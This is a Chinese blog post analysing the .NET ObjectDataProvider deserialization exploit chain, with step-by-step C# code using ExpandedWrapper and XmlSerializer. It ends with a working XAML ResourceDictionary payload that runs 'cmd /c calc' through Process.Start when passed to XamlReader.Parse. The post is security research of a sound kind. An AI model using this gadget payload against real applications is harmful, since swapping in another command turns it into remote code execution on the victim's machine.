---
title: ObjectDataProvider 利用链 - nice_0e3
url: https://www.cnblogs.com/nice0e3/p/16942833.html
source: 博客园 - nice_0e3
date: 2022-12-02
fetch_date: 2025-10-04T00:17:38.586723
---

# ObjectDataProvider 利用链 - nice_0e3

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/nice0e3/)

# [nice\_0e3](https://www.cnblogs.com/nice0e3)

## 理想与热爱

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/nice0e3/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/nice_0e3)
* 订阅
* [管理](https://i.cnblogs.com/)

# [ObjectDataProvider 利用链](https://www.cnblogs.com/nice0e3/p/16942833.html "发布于 2022-12-01 21:26")

## 前置介绍

### ObjectDataProvider

命名空间:

[System.Windows.Data](https://learn.microsoft.com/zh-cn/dotnet/api/system.windows.data?view=windowsdesktop-6.0)

程序集:

PresentationFramework.dll

包装和创建可以用作绑定源的对象。

ObjectDataProvider，顾名思义就是把对象作为数据源提供给Binding

### 数据源

WPF (全称：Windows Presentation Foundation) 是用于替代Windows Form来创建Windows客户端应用程序，WPF开发过程中主要有以下几种数据绑定方法，这些对象可以视为数据源绑定到控件

### ResourceDictionary

ResourceDictionary即资源字典，用于wpf开发，资源中也可引入XAML名称空间

### ExpandedWrapper

#### 定义

命名空间:

[System.Data.Services.Internal](https://learn.microsoft.com/zh-cn/dotnet/api/system.data.services.internal?view=netframework-4.8)

程序集:

System.Data.Services.dll

系统在内部使用此类，以便可支持预先加载了相关实体的查询。

此 API 支持产品基础结构，不能在代码中直接使用。

```
public sealed class ExpandedWrapper<TExpandedElement,TProperty0,TProperty1,TProperty2> : System.Data.Services.Internal.ExpandedWrapper<TExpandedElement>
```

#### 类型参数

TExpandedElement

扩展元素的类型。

TProperty0

要扩展的属性的类型。

TProperty1

要扩展的属性的类型。

TProperty2

要扩展的属性的类型。

## 利用链调试

```
         MemoryStream memoryStream = new MemoryStream();

            TextWriter writer = new StreamWriter(memoryStream);
            ProcessStartInfo processinfo = new ProcessStartInfo();
            processinfo.FileName = "cmd.exe";
            processinfo.Arguments = " /c calc.exe";

            var process = new Process();
            process.StartInfo = processinfo;

            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "Start";
            odp.ObjectInstance = process;

            XmlSerializer xml = new XmlSerializer(typeof(Object));
            xml.Serialize(writer, odp);
```

在设置ObjectInstance，MethodParameters，MethodName时，ObjectDataProvider都会尝试执行目标函数，但是在序列化会发现报错

```
InvalidOperationException: 不应是类型 System.Windows.Data.ObjectDataProvider。使用 XmlInclude 或 SoapInclude 特性静态指定非已知的类型。
```

需要序列化odp对象是一个未知的类。ObjectDataProvider是不能被直接序列化的，可以使用`ExpandedWrapper`类来做包装。它的作用就是扩展类的属性。

修改代码

```
 static void Main(string[] args)
        {

            MemoryStream memoryStream = new MemoryStream();

            TextWriter writer = new StreamWriter(memoryStream);

            var process = new Process();

            ObjectDataProvider odp = new ObjectDataProvider();

            var Expandedwrapper = new ExpandedWrapper<Process, ObjectDataProvider>();
            Expandedwrapper.ProjectedProperty0 = odp;
            Expandedwrapper.ProjectedProperty0.ObjectInstance = process;
            Expandedwrapper.ProjectedProperty0.MethodParameters.Add("calc");

            Expandedwrapper.ProjectedProperty0.MethodName = "Start";

            XmlSerializer xml = new XmlSerializer(typeof(Object));
            xml.Serialize(writer, Expandedwrapper);

        }
```

![img](https://img2023.cnblogs.com/blog/1993669/202212/1993669-20221202191016033-1192937896.png)

这样没了能执行起来，但是序列化数据失败了，原因是因为使用`ExpandedWrapper`去包装Process，是无法序列化的。

改造代码

```
    public class EvilClass
    {

        public void Evil(string cmd)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + cmd;
            process.Start();
        }
    }

static void Main(string[] args)
        {

            MemoryStream memoryStream = new MemoryStream();

            TextWriter writer = new StreamWriter(memoryStream);

            ObjectDataProvider odp = new ObjectDataProvider();

            var Expandedwrapper = new ExpandedWrapper<EvilClass, ObjectDataProvider>();
            Expandedwrapper.ProjectedProperty0 = odp;
            Expandedwrapper.ProjectedProperty0.ObjectInstance = new EvilClass();
            Expandedwrapper.ProjectedProperty0.MethodParameters.Add("calc");

            Expandedwrapper.ProjectedProperty0.MethodName = "Evil";

            XmlSerializer xml = new XmlSerializer(typeof(ExpandedWrapper<EvilClass, ObjectDataProvider>));
            xml.Serialize(writer, Expandedwrapper);

            memoryStream.Position = 0;

            // 输出xml
            Console.WriteLine(Encoding.UTF8.GetString(memoryStream.ToArray()));

        }
    }
```

![img](https://img2023.cnblogs.com/blog/1993669/202212/1993669-20221202191022439-1628347302.png)

自定义了一个类和方法 方法 自定义的方法里面去调用Process去执行命令。这样序列化数据就不会报错了。但是在实际利用中肯定是不能这样用的。因为目标上没有我们构造的这个类。所以需要寻找一个合适的类来做串联。

### **XamlReader**

ExpandedWrapper可以被XmlSerializer序列化，同时XAML还可以通过XamlReader.Parse实现反序列化返回`ExpandedWrapper`对象。构造的恶意`ExpandedWrapper`会调用Process进行命令执行.

## ResourceDictionary

ResourceDictionary又称资源字典，使用xaml语法

以下是执行命令的`ResourceDictionary`执行命令的一个payload

```
<ResourceDictionary
                    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                    xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml"
                    xmlns:b="clr-namespace:System;assembly=mscorlib"
                    xmlns:c="clr-namespace:System.Diagnostics;assembly=system">
    <ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start">
        <ObjectDataProvider.MethodParameters>
            <b:String>cmd</b:String>
            <b:String>/c calc</b:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>
```

1. xmlns:c 引用了System.Diagnostics命名空间起别名为c
2. d:Key="" 起别名为空，在xaml语法中，Key这个键值必须有。
3. ObjectType表示对象类型
4. d:Type 等同于typeof()
5. MethodName是ObjectDataProvider的属性，传递一个Start等于调用Start方法。
6. c:Process 等同于System.Diagnostics.Process

```
 static void Main(string[] args)
        {

            string xaml = "<ResourceDictionary \r\n                    xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" \r\n                    xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" \r\n                    xmlns:b=\"clr-namespace:System;assembly=mscorlib\" \r\n                    xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\">\r\n    <ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\">\r\n        <ObjectDataProvider.MethodParameters>\r\n            <b:String>cmd</b:String>\r\n            <b:String>/c calc</b:String>\r\n        </ObjectDataProvider.MethodParameters>\r\n    </ObjectDataProvider>\r\n</ResourceDictionary>";
            XamlReader.Parse(xaml);

        }
```

![img](https://img2023.cnblogs.com/...